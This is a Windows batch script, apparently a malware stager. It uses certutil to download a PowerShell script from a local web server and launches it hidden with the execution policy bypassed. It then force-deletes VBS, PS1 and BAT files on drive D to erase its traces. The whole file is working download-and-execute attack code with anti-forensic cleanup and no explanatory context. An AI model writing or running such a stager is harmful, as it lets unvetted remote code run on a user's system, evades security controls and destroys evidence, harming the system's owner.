@echo off
certutil | certutil -urlcache -split -f http://127.0.0.1:8080/POWERSHELL.PS1 d:\\POWERSHELL.PS1
TIMEOUT /T 1
start /B powershell.exe -executionpolicy bypass -file d:\\POWERSHELL.PS1
del D:\R*.VBS /f /s /q
TIMEOUT /T 1
del D:\P*.PS1 /f /s /q
del D:\P*.BAT /f /s /q
exit